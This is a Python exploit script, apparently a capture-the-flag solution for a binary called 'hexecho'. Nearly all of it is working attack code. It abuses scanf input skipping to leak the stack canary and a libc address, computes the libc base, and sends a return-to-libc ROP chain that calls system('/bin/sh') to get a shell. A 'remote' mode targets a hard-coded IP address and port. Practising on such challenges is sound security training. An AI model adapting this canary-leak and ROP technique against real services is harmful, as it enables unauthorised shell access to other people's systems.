#!/usr/bin/env python
import sys
import ptrlib as ptr

exe = ptr.ELF("./hexecho_patched")
libc = ptr.ELF("./libc.so.6")
ld = ptr.ELF("./ld-2.35.so")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return ptr.Socket("34.170.146.252", 42019)
    else:
        return ptr.Process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def main():
    io = connect()

    offset = 0x110
    canary_offset = 0x108
    scanf_skip_size = 16

    payload_frontof_canary = b"A" * canary_offset

    payload_backof_canary = b"\x32\x71\x34\x00" + b"\x00" * 4  # main: 0x401327

    size = (
        len(payload_frontof_canary) + len(payload_backof_canary) + scanf_skip_size + 100
    )

    io.sendlineafter("Size:", str(size))  # size input
    io.sendafter("Data (hex): ", payload_frontof_canary.hex())
    io.send("+" * scanf_skip_size)
    io.send(payload_backof_canary.hex())
    io.sendline("+" * 100)

    io.recvuntil("41 41 00 ")
    canary_list = io.recvonce(3 * 7).split(b" ")[:-1]
    canary_list.reverse()
    canary_list.append(b"00")
    canary = int(b"".join(canary_list), 16)
    ptr.logger.info(f"canary: {hex(canary)}")

    io.recvonce(3 * 8)
    io.recvonce(3 * 8)
    io.recvonce(3 * 8)
    libc_list = io.recvonce(3 * 8).split(b" ")[:-1]
    libc_list.reverse()
    libc.base = (
        int(b"".join(libc_list), 16)
        - unwrap(libc.symbol("__libc_start_call_main"))
        - 128
    )

    rop_ret = next(libc.gadget("ret;"))
    rop_pop_rdi_ret = next(libc.gadget("pop rdi; ret;"))
    bin_sh = next(libc.search(b"/bin/sh"))
    system = unwrap(libc.symbol("system"))

    payload = b"A" * canary_offset
    payload += ptr.p64(canary)
    payload += b"A" * (offset - canary_offset)
    payload += ptr.p64(rop_ret)
    payload += ptr.p64(rop_pop_rdi_ret)
    payload += ptr.p64(bin_sh)
    payload += ptr.p64(system)

    io.sendlineafter("Size: ", str(len(payload)))
    io.sendlineafter("Data (hex): ", payload.hex())

    io.recvline()

    io.sh()
    return


if __name__ == "__main__":
    main()
